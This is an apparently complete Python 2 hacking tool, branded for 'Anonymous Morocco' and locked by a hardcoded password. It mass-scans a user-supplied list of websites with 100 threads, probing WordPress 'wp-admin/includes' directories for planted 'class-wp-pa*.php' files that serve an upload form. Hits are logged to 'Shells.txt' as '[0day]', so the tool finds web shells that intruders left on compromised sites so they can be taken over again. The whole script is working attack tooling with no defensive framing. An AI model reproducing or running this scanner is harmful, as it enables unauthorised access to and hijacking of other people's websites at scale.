import sys, requests, re, socket, random, string, base64, os
from colorama import init
from os import system, getcwd
from multiprocessing.dummy import Pool
from colorama import Fore, Back, Style
init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN

def Clear():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][(os.name == 'nt')])


Clear()                                                                   
print Fore.GREEN + '\nTool Jokeir 07x Wlecome To Anonymous Morocco\n\n '
requests.urllib3.disable_warnings()
password = raw_input(Fore.RED + 'Enter Your Password jokeir 07x: \n')
if password == 'jokeir07x':
    try:
        TargetList = raw_input(Fore.LIGHTBLUE_EX + 'Enter Your Target List : Example {Jokeir 07x} : Site.txt \n')
        target = [ i.strip() for i in open(TargetList, mode='r').readlines() ]
    except IndexError:
        path = str(sys.argv[0]).split('\\')
        exit('\n  [!] Enter <' + path[(len(path) - 1)] + '> <sites.txt>')

else:
    Clear()
    print 'Not Valid Password'
headers = {'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 
   'Upgrade-Insecure-Requests': '1', 
   'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 
   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
   'Accept-Encoding': 'gzip, deflate', 
   'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 
   'referer': 'www.google.com'}

def ran(length):
    letters = string.ascii_lowercase
    return ('').join(random.choice(letters) for i in range(length))


def URLdomain(site):
    if 'http://' not in site and 'https://' not in site:
        site = 'http://' + site
    if site[(-1)] is not '/':
        site = site + '/'
    return site


def domain(site):
    if site.startswith('http://'):
        site = site.replace('http://', '')
    else:
        if site.startswith('https://'):
            site = site.replace('https://', '')
        if 'www.' in site:
            site = site.replace('www.', '')
        site = site.rstrip()
        if site.split('/'):
            site = site.split('/')[0]
        while site[(-1)] == '':
            pattern = re.compile('(.*)/')
            sitez = re.findall(pattern, site)
            site = sitez[0]

    return site


def addWWW(site):
    if site.startswith('http://'):
        site = site.replace('http://', 'http://www.')
    elif site.startswith('https://'):
        site = site.replace('https://', 'https://www.')
    else:
        site = 'http://www.' + site
    return site


def exploit(url):
    try:
        dom = domain(url)
        url = URLdomain(url)
        if 'www.' in url:
            username = url.replace('www.', '')
        else:
            username = url
        if '.' in username:
            username = username.split('.')[0]
        if 'http://' in username:
            username = username.replace('http://', '')
        else:
            username = username.replace('https://', '')
        up = username.title()
        listdir = ['wp-admin/includes/', 'wp/wp-admin/includes/', 'wordpress/wp-admin/includes/', 'site/wp-admin/includes/', 'blog/wp-admin/includes/']
        for directory in listdir:
            inj = url + directory
            check = requests.get(inj, headers=headers, verify=False, timeout=15).content
            if 'class-wp-pa' in check:
                if re.findall(re.compile('(.*)class-wp-page(.*)\\.php"'), check):
                    fileX = 'class-wp-pa' + re.findall(re.compile('(.*)class-wp-pa(.*)\\.php"'), check)[0][1] + '.php'
                    src2 = requests.get(url + directory + fileX, headers=headers, timeout=15).content
                    if 'type="file"' in src2:
                        open('Shells.txt', 'a').write(url + directory + fileX + ' \n')
                        print ' -| ' + url + ('--> {}[0day]').format(fg)
                        break
                    else:
                        print ' -| ' + url + ('--> {}[Failed]').format(fr)
                else:
                    print ' -| ' + url + ('--> {}[Failed]').format(fr)
            else:
                print ' -| ' + url + ('--> {}[Failed]').format(fr)

    except:
        print ' -| ' + url + ('--> {}[Failed]').format(fr)


mp = Pool(100)
mp.map(exploit, target)
mp.close()
mp.join()
